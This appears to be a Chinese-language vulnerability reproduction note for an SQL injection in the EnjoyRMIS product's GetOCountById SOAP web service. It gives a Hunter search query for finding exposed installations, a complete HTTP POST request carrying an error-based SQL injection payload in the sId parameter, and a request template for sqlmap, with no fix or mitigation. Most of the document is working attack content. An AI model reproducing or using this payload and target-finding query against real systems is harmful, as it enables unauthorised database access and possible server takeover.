# EnjoyRMIS GetOCountById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetOCountById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/-3EM53KFP-oCpuOA/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-012616.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCountById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCountById xmlns="http://tempuri.org/">
      <sId>string' AND 8494 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (8494=8494) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113))) AND 'PDAF'='PDAF</sId>
    </GetOCountById>
  </soap:Body>
</soap:Envelope>
```

![1700644829789-6c2f4976-77e4-48f8-8a32-d8c69fa73016.png](./img/-3EM53KFP-oCpuOA/1700644829789-6c2f4976-77e4-48f8-8a32-d8c69fa73016-290198.png)

sqlmap

```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCountById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCountById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetOCountById>
  </soap:Body>
</soap:Envelope>
```

![1700644943219-a87f98e3-c3f0-4d3a-95f2-5b6d4eae0dac.png](./img/-3EM53KFP-oCpuOA/1700644943219-a87f98e3-c3f0-4d3a-95f2-5b6d4eae0dac-124917.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gogy2b6p3055hkci>